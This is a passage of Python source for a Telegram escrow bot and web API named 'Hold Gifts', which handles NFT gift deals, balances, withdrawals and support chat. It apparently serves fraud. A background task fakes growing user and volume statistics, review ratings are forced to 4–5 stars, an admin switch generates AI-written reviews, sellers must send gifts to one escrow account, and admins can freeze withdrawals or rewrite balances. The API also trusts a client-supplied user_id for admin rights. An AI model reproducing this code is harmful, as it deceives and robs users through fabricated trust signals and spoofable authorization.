    await message.answer(f"Оплата по сделке #{deal_id} подтверждена.")
    if deal.get("seller_id"):
        try:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Передать подарок", url=f"tg://send_gift?to={ESCROW_ACCOUNT}")],
                [InlineKeyboardButton(text="Открыть сделки", web_app=WebAppInfo(url=build_webapp_url(deal["seller_id"], page="deals")))]
            ])
            await bot.send_message(
                deal["seller_id"],
                f"<b>Сделка #{deal_id} оплачена</b>\n\n"
                f"Товар: {deal['product']}\n"
                f"Сумма: {deal['amount']} {deal['currency']}\n"
                f"Передайте подарок на @{ESCROW_ACCOUNT} и подтвердите передачу в приложении.",
                reply_markup=kb
            )
        except Exception:
            pass

@dp.message(Command("delete_deal"))
async def delete_deal_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in deals:
        await message.answer("Использование: /delete_deal [deal_id]")
        return
    del deals[args[1]]
    save_json(FILES["deals"], deals)
    await message.answer(f"Сделка #{args[1]} удалена.")

@dp.callback_query(lambda c: c.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    text = f"<b>Пользователи ({len(balance)})</b>\n\n"
    for uid, b in list(balance.items())[-20:]:
        text += f"<code>{uid}</code>: TON {b.get('ton', 0)} | STARS {b.get('stars', 0)} | RUB {b.get('rub', 0)} | UAH {b.get('uah', 0)}\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text("Активных заявок на вывод нет.", reply_markup=admin_panel_keyboard())
        return
    text = "<b>Заявки на вывод</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"<b>#{rid}</b> | ID: {req['user_id']} | {req['amount']} {req['currency']}\nРеквизиты: {req['details']}\n/confirm_withdraw {rid}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in withdraw_requests:
        await message.answer("Использование: /confirm_withdraw [ID]")
        return
    req = withdraw_requests[args[1]]
    bal = get_balance(req["user_id"])
    curr = req["currency"].lower()
    if bal.get(curr, 0) >= req["amount"]:
        bal[curr] = round(bal[curr] - req["amount"], 4)
        save_json(FILES["balance"], balance)
    req["status"] = "completed"
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"Вывод #{args[1]} подтверждён.")

@dp.callback_query(lambda c: c.data == "admin_tickets")
async def admin_tickets(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    active_chats = {uid: msgs for uid, msgs in chat_messages.items() if msgs}
    if not active_chats:
        await callback.message.edit_text("Сообщений в чате пока нет.", reply_markup=admin_panel_keyboard())
        return
    text = "<b>Чаты поддержки</b>\n\n"
    for uid, msgs in list(active_chats.items())[-10:]:
        last = msgs[-1]
        text += f"ID: <code>{uid}</code> — {last.get('text', '')[:50]}\nОтветить: <code>/chat_reply {uid} текст</code>\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("chat_reply"))
async def chat_reply_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("Использование: /chat_reply [user_id] [ответ]")
        return
    target_uid, reply_text = args[1], args[2]
    chat_messages.setdefault(target_uid, []).append({
        "id": "m" + str(uuid.uuid4())[:8],
        "text": reply_text,
        "sender": "admin",
        "timestamp": datetime.now().isoformat(),
        "read": False
    })
    save_json(FILES["chat_messages"], chat_messages)
    await message.answer(f"Ответ отправлен пользователю {target_uid}.")
    try:
        await bot.send_message(
            int(target_uid),
            f"<b>Новое сообщение от поддержки:</b>\n\n{reply_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Открыть чат", web_app=WebAppInfo(url=build_webapp_url(int(target_uid), page="support")))]
            ])
        )
    except Exception:
        pass

@dp.callback_query(lambda c: c.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    vol = round(sum(d.get("amount", 0) for d in deals.values() if d.get("currency") == "TON"), 1)
    await callback.message.edit_text(
        f"<b>Статистика</b>\n\n"
        f"Пользователей: <b>{len(balance)}</b>\n"
        f"Всего сделок: <b>{len(deals)}</b>\n"
        f"Объём TON: <b>{vol}</b>\n"
        f"Отзывов: <b>{len(reviews_data.get('items', []))}</b>",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await callback.message.edit_text("Введите Telegram ID пользователя:")
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    try:
        uid = int(message.text.strip())
        await state.update_data(target_user_id=uid)
        await message.answer("Выберите валюту:", reply_markup=currency_keyboard())
        await state.set_state(AdminStates.waiting_currency)
    except Exception:
        await message.answer("Введите корректный числовой ID.")

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(target_currency=callback.data.split("_")[1])
    await callback.message.edit_text("Введите сумму начисления:")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        add_balance(data["target_user_id"], data["target_currency"], amount)
        await message.answer(
            f"Начислено <b>{amount} {data['target_currency']}</b> пользователю <code>{data['target_user_id']}</code>.",
            reply_markup=admin_panel_keyboard()
        )
        await state.clear()
    except Exception:
        await message.answer("Введите положительное число.")

@dp.callback_query(lambda c: c.data == "admin_manage_admins")
async def admin_manage_admins(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    all_adm = sorted(list(DEFAULT_ADMINS.union({int(k) for k in admins.keys()})))
    await callback.message.edit_text(
        "<b>Администраторы</b>\n\n" + "\n".join(f"• <code>{a}</code>" for a in all_adm) + "\n\n/add_admin [ID] | /remove_admin [ID]",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

@dp.message(Command("add_admin"))
async def add_admin(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) == 2 and args[1].isdigit():
        admins[args[1]] = True
        save_json(FILES["admins"], admins)
        await message.answer(f"Админ добавлен: {args[1]}")

@dp.message(Command("remove_admin"))
async def remove_admin(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) == 2 and args[1].isdigit() and int(args[1]) not in DEFAULT_ADMINS:
        admins.pop(args[1], None)
        save_json(FILES["admins"], admins)
        await message.answer(f"Админ удалён: {args[1]}")

# ============================================================
# 10. ФОНОВАЯ СТАТИСТИКА
# ============================================================
async def auto_increment_stats():
    while True:
        try:
            s = load_json(FILES["stats"], {})
            s["users"] = max(21481, s.get("users", 21481)) + random.randint(1, 3)
            s["deals_today"] = max(1287, s.get("deals_today", 1287)) + random.randint(0, 2)
            vol = s.get("volume", 627.4) * (1 + random.uniform(-0.3, 0.4) * 0.02)
            s["volume"] = round(max(627.4, min(9470.0, vol)), 1)
            save_json(FILES["stats"], s)
        except Exception:
            pass
        await asyncio.sleep(300)

# ============================================================
# 11. API И РАЗДАЧА MINI APP
# ============================================================
async def handle_web_request(request: web.Request):
    headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    }

    if request.method == "OPTIONS":
        return web.Response(headers=headers, status=200)

    endpoint = request.path

    if request.method == "GET" and not endpoint.startswith("/api/"):
        if os.path.exists("index.html"):
            return web.FileResponse("index.html")
        return web.json_response({"status": "running"}, headers=headers)

    try:
        data = await request.json()
    except Exception:
        data = {}

    user_id = data.get("user_id")
    username = (data.get("username") or "").replace("@", "").strip()

    if endpoint == "/api/get_language":
        return web.json_response({"success": True, "lang": get_user_language(user_id) or "ru"}, headers=headers)

    elif endpoint == "/api/set_language":
        lang = data.get("lang", "ru")
        if user_id and lang in ("ru", "en"):
            set_user_language(user_id, lang)
        return web.json_response({"success": True, "lang": lang}, headers=headers)

    elif endpoint == "/api/balance":
        if not user_id:
            return web.json_response({"success": False, "error": "user_id required"}, headers=headers)
        return web.json_response({"success": True, "balance": get_balance(user_id)}, headers=headers)

    elif endpoint == "/api/stats":
        return web.json_response({
            "success": True,
            "deals_today": stats.get("deals_today", 1287),
            "users": stats.get("users", 21481),
            "volume": stats.get("volume", 627.4)
        }, headers=headers)

    elif endpoint == "/api/is_admin":
        return web.json_response({"success": True, "is_admin": is_admin(user_id)}, headers=headers)

    # ОТЗЫВЫ (ПОЛУЧЕНИЕ + ДОБАВЛЕНИЕ ПОСЛЕ 1 ЗАВЕРШЁННОЙ СДЕЛКИ)
    elif endpoint == "/api/reviews":
        can_review = user_has_completed_deal(user_id, username) or is_admin(user_id)
        items = reviews_data.get("items", [])[:60]
        return web.json_response({
            "success": True,
            "reviews": items,
            "can_review": can_review
        }, headers=headers)

    elif endpoint == "/api/add_review":
        if not user_id:
            return web.json_response({"success": False, "error": "Требуется авторизация"}, headers=headers)

        if not (user_has_completed_deal(user_id, username) or is_admin(user_id)):
            return web.json_response({
                "success": False,
                "error": "Оставить отзыв можно только после завершения хотя бы 1 сделки"
            }, headers=headers)

        text = (data.get("text") or "").strip()
        rating = int(data.get("rating") or 5)
        rating = max(4, min(5, rating))

        if len(text) < 5:
            return web.json_response({"success": False, "error": "Напишите текст отзыва"}, headers=headers)

        entry = {
            "id": "rev_" + str(uuid.uuid4())[:8],
            "author_ru": "Анонимный пользователь",
            "author_en": "Anonymous user",
            "rating": rating,
            "text": text[:500],
            "date": datetime.now().isoformat(),
            "source": "user"
        }
        reviews_data["items"].insert(0, entry)
        save_json(FILES["reviews"], reviews_data)
        return web.json_response({"success": True, "review": entry}, headers=headers)

    elif endpoint == "/api/admin_ai_control":
        if not is_admin(user_id):
            return web.json_response({"success": False, "error": "Admin required"}, headers=headers)
        action = data.get("action")
        if action == "toggle":
            ai_state["enabled"] = not bool(ai_state.get("enabled"))
            save_json(FILES["ai_state"], ai_state)
        elif action == "generate_now":
            entry = await generate_ai_review_entry()
            if not entry:
                return web.json_response({"success": False, "error": "Не удалось сгенерировать отзыв"}, headers=headers)
        elif action == "delete_review":
            rid = data.get("review_id")
            reviews_data["items"] = [r for r in reviews_data.get("items", []) if r.get("id") != rid]
            save_json(FILES["reviews"], reviews_data)

        return web.json_response({
            "success": True,
            "ai_enabled": bool(ai_state.get("enabled")),
            "last_model": ai_state.get("last_model"),
            "reviews": reviews_data.get("items", [])[:60]
        }, headers=headers)

    # СОЗДАНИЕ СДЕЛКИ
    elif endpoint == "/api/create_deal":
        product = (data.get("product") or "").strip()
        currency = (data.get("currency") or "TON").upper()
        amount = data.get("amount")
        partner = (data.get("partner_username") or "").replace("@", "").strip()
        creator_role = data.get("creator_role", "seller")
        category = data.get("category", "nft_gift")
        raw_nft_link = (data.get("nft_link") or "").strip()

        if not all([user_id, product, currency, amount, partner]):
            return web.json_response({"success": False, "error": "Заполните все поля"}, headers=headers)

        parsed_nft = None
        if category == "nft_gift":
            parsed_nft = parse_nft_link(raw_nft_link)
            if not parsed_nft:
                return web.json_response({
                    "success": False,
                    "error": "Неверный формат ссылки NFT. Пример: t.me/nft/PlushPepe-120"
                }, headers=headers)
        elif raw_nft_link:
            parsed_nft = parse_nft_link(raw_nft_link)

        nft_url = parsed_nft["url"] if parsed_nft else None

        creator_uname = (username or str(user_id)).lower()
        if creator_role == "buyer":
            seller_id, seller_username = None, partner.lower()
            buyer_id, buyer_username = user_id, creator_uname
            buyer_joined, seller_joined = True, False
        else:
            seller_id, seller_username = user_id, creator_uname
            buyer_id, buyer_username = None, partner.lower()
            seller_joined, buyer_joined = True, False

        deal_id = str(uuid.uuid4())[:8]
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

        deals[deal_id] = {
            "deal_id": deal_id,
            "creator_role": creator_role,
            "seller_id": seller_id,
            "seller_username": seller_username,
            "buyer_id": buyer_id,
            "buyer_username": buyer_username,
            "seller_joined": seller_joined,
            "buyer_joined": buyer_joined,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "category": category,
            "nft_link": nft_url,
            "nft_name": parsed_nft["name"] if parsed_nft else None,
            "nft_number": parsed_nft["number"] if parsed_nft else None,
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "completed_at": None
        }
        save_json(FILES["deals"], deals)

        try:
            share_url = f"https://t.me/share/url?url={link}&text=Hold%20Gifts%20Deal%20%23{deal_id}"
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Переслать ссылку участнику", url=share_url)],
                [InlineKeyboardButton(text="Открыть сделку", web_app=WebAppInfo(url=build_webapp_url(user_id, page="deals", deal_id=deal_id)))]
            ])
            await bot.send_message(
                int(user_id),
                f"<b>Сделка #{deal_id} создана</b>\n\n"
                f"Товар: <b>{product}</b>\n"
                f"Сумма: <b>{amount} {currency}</b>\n"
                f"Продавец: @{seller_username}\n"
                f"Покупатель: @{buyer_username}\n"
                f"{f'NFT: {nft_url}' + chr(10) if nft_url else ''}\n"
                f"Отправьте эту ссылку второму участнику (оплата откроется после того, как оба зайдут в сделку):\n"
                f"<code>{link}</code>",
                reply_markup=kb
            )
        except Exception as e:
            print(f"Ошибка отправки ссылки создателю: {e}")

        nft_admin_block = (
            f"\nNFT подарок: <b>{parsed_nft['name']} #{parsed_nft['number']}</b>\n"
            f"Ссылка на NFT: {nft_url}"
            if parsed_nft else ""
        )
        await notify_admins(
            f"<b>Новая сделка #{deal_id}</b>\n\n"
            f"Создатель: @{creator_uname} (ID: <code>{user_id}</code>)\n"
            f"Продавец: @{seller_username}\n"
            f"Покупатель: @{buyer_username}\n"
            f"Товар: <b>{product}</b>\n"
            f"Сумма: <b>{amount} {currency}</b>"
            f"{nft_admin_block}\n\n"
            f"Ссылка сделки: {link}"
        )

        return web.json_response({"success": True, "deal_id": deal_id, "link": link, "deal": deals[deal_id]}, headers=headers)

    elif endpoint == "/api/deals":
        if not user_id:
            return web.json_response({"success": False, "error": "user_id required"}, headers=headers)
        uname_low = username.lower()
        res_list = []
        for d_id, d in deals.items():
            if (
                d.get("seller_id") == user_id
                or d.get("buyer_id") == user_id
                or (uname_low and d.get("seller_username", "").lower() == uname_low)
                or (uname_low and d.get("buyer_username", "").lower() == uname_low)
            ):
                d_copy = d.copy()
                d_copy["deal_id"] = d_id
                res_list.append(d_copy)
        return web.json_response({"success": True, "deals": list(reversed(res_list))}, headers=headers)

    elif endpoint == "/api/pay_balance":
        deal_id = data.get("deal_id")
        if deal_id not in deals:
            return web.json_response({"success": False, "error": "Сделка не найдена"}, headers=headers)
        deal = deals[deal_id]

        if not (deal.get("buyer_joined") and deal.get("seller_joined")):
            return web.json_response({
                "success": False,
                "error": "Оплата заблокирована: оба участника должны сначала зайти в сделку по ссылке"
            }, headers=headers)

        if deal["status"] != "waiting_payment":
            return web.json_response({"success": False, "error": "Сделка уже оплачена"}, headers=headers)

        bal = get_balance(user_id)
        curr = deal["currency"].lower()
        if bal.get(curr, 0) < deal["amount"]:
            return web.json_response({"success": False, "error": f"Недостаточно {deal['currency']} на балансе"}, headers=headers)

        bal[curr] = round(bal[curr] - deal["amount"], 4)
        save_json(FILES["balance"], balance)

        deal["status"] = "paid"
        deal["buyer_id"] = user_id
        save_json(FILES["deals"], deals)

        if deal.get("seller_id"):
            try:
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Передать подарок", url=f"tg://send_gift?to={ESCROW_ACCOUNT}")],
                    [InlineKeyboardButton(text="Открыть сделки", web_app=WebAppInfo(url=build_webapp_url(deal["seller_id"], page="deals")))]
                ])
                await bot.send_message(
                    deal["seller_id"],
                    f"<b>Сделка #{deal_id} оплачена</b>\n\n"
                    f"Товар: {deal['product']}\n"
                    f"Сумма: {deal['amount']} {deal['currency']}\n"
                    f"Передайте подарок на @{ESCROW_ACCOUNT} и подтвердите передачу в приложении.",
                    reply_markup=kb
                )
            except Exception:
                pass

        return web.json_response({"success": True}, headers=headers)

    elif endpoint in ("/api/seller_delivered", "/api/transfer_nft"):
        deal_id = data.get("deal_id")
        if deal_id not in deals:
            return web.json_response({"success": False, "error": "Сделка не найдена"}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "paid":
            return web.json_response({"success": False, "error": "Сделка не оплачена"}, headers=headers)
        deal["status"] = "awaiting_confirmation"
        deal["seller_id"] = user_id
        save_json(FILES["deals"], deals)

        if deal.get("buyer_id"):
            try:
                await bot.send_message(
                    deal["buyer_id"],
                    f"<b>Продавец передал товар по сделке #{deal_id}</b>\n\nПодтвердите получение в приложении.",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Подтвердить получение", web_app=WebAppInfo(url=build_webapp_url(deal["buyer_id"], page="deals")))]
                    ])
                )
            except Exception:
                pass
        return web.json_response({"success": True}, headers=headers)

    elif endpoint == "/api/buyer_confirm":
        deal_id = data.get("deal_id")
        if deal_id not in deals:
            return web.json_response({"success": False, "error": "Сделка не найдена"}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({"success": False, "error": "Неверный статус сделки"}, headers=headers)

        if deal.get("seller_id"):
            add_balance(deal["seller_id"], deal["currency"], deal["amount"])
            try:
                await bot.send_message(
                    deal["seller_id"],
                    f"<b>Сделка #{deal_id} завершена</b>\nЗачислено: {deal['amount']} {deal['currency']}."
                )
            except Exception:
                pass

        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        return web.json_response({"success": True}, headers=headers)

    elif endpoint == "/api/get_rekvisits":
        deal_id = data.get("deal_id")
        if deal_id not in deals:
            return web.json_response({"success": False, "error": "Сделка не найдена"}, headers=headers)
        deal = deals[deal_id]
        if not (deal.get("buyer_joined") and deal.get("seller_joined")):
            return web.json_response({"success": False, "error": "Оба участника должны сначала зайти в сделку по ссылке"}, headers=headers)
        details = rekvisits.get(deal["currency"].lower(), f"Для получения реквизитов оплаты ({deal['amount']} {deal['currency']}) напишите @{ESCROW_ACCOUNT} и укажите номер сделки #{deal_id}.")
        return web.json_response({"success": True, "details": details}, headers=headers)

    elif endpoint == "/api/confirm_rekvisits_payment":
        deal_id = data.get("deal_id")
        if deal_id in deals:
            await notify_admins(f"Заявка на оплату по реквизитам: сделка #{deal_id}\nПодтвердить: /pay {deal_id}")
        return web.json_response({"success": True}, headers=headers)

    elif endpoint == "/api/chat_history":
        uid_str = str(data.get("target_user_id") or user_id)
        msgs = chat_messages.get(uid_str, [])
        if is_admin(user_id) and data.get("target_user_id"):
            changed = False
            for m in msgs:
                if m.get("sender") == "user" and not m.get("read"):
                    m["read"] = True
                    changed = True
            if changed:
                save_json(FILES["chat_messages"], chat_messages)
        return web.json_response({"success": True, "messages": msgs}, headers=headers)

    elif endpoint == "/api/chat_send":
        uid_str = str(data.get("target_user_id") or user_id)
        text = (data.get("text") or "").strip()
        sender = data.get("sender", "user")
        if not uid_str or not text:
            return web.json_response({"success": False, "error": "Пустое сообщение"}, headers=headers)

        chat_messages.setdefault(uid_str, []).append({
            "id": "m" + str(uuid.uuid4())[:8],
            "text": text,
            "sender": sender,
            "username": username or uid_str,
            "timestamp": datetime.now().isoformat(),
            "read": sender == "admin"
        })
        save_json(FILES["chat_messages"], chat_messages)

        if sender == "user":
            await notify_admins(
                f"<b>Сообщение в чат поддержки</b>\n"
                f"От: @{username or uid_str} (ID: <code>{uid_str}</code>)\n"
                f"Текст: {text}\n\n"
                f"Ответить: <code>/chat_reply {uid_str} ваш ответ</code>"
            )
        else:
            try:
                await bot.send_message(
                    int(uid_str),
                    f"<b>Ответ поддержки Hold Gifts:</b>\n\n{text}",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Открыть чат", web_app=WebAppInfo(url=build_webapp_url(int(uid_str), page="support")))]
                    ])
                )
            except Exception:
                pass

        return web.json_response({"success": True}, headers=headers)

    elif endpoint == "/api/admin_panel_data":
        if not is_admin(user_id):
            return web.json_response({"success": False, "error": "Admin required"}, headers=headers)
        return web.json_response({
            "success": True,
            "deals": list(reversed(list(deals.values())))[:50],
            "chats": chat_messages,
            "ai_enabled": bool(ai_state.get("enabled")),
            "last_model": ai_state.get("last_model"),
            "reviews": reviews_data.get("items", [])[:60]
        }, headers=headers)

    elif endpoint == "/api/admin_delete_deal":
        if is_admin(user_id) and data.get("deal_id") in deals:
            del deals[data["deal_id"]]
            save_json(FILES["deals"], deals)
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_add_balance":
        if is_admin(user_id):
            add_balance(data.get("target_user_id"), data.get("currency", "TON"), float(data.get("amount", 0)))
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_set_balance":
        if is_admin(user_id):
            set_balance(data.get("target_user_id"), data.get("currency", "TON"), float(data.get("amount", 0)))
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_remove_balance":
        if is_admin(user_id):
            tid = str(data.get("target_user_id"))
            curr = data.get("currency", "TON").lower()
            bal = get_balance(tid)
            bal[curr] = max(0, round(bal.get(curr, 0) - float(data.get("amount", 0)), 4))
            save_json(FILES["balance"], balance)
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_set_freeze":
        if is_admin(user_id):
            tid = str(data.get("target_user_id"))
            mins = int(data.get("minutes") or 0)
            if mins <= 0:
                freeze_data.pop(tid, None)
            else:
                freeze_data[tid] = {
                    "until": int(datetime.now().timestamp() * 1000) + mins * 60000,
                    "reason": data.get("reason") or "Ограничение вывода"
                }
            save_json(FILES["freeze"], freeze_data)
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_get_freeze":
        tid = str(data.get("target_user_id") or user_id)
        fr = freeze_data.get(tid)
        if not fr or datetime.now().timestamp() * 1000 > fr.get("until", 0):
            return web.json_response({"success": True, "frozen": False}, headers=headers)
        return web.json_response({"success": True, "frozen": True, "until": fr["until"], "reason": fr.get("reason", "")}, headers=headers)

    return web.json_response({"success": False, "error": "Unknown endpoint"}, headers=headers)

# ============================================================
# 12. ЗАПУСК
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route("*", "/{path:.*}", handle_web_request)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"Сервер запущен на порту {PORT}")

async def main():
    asyncio.create_task(auto_increment_stats())
    asyncio.create_task(ai_reviews_background_loop())
    await start_web_server()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
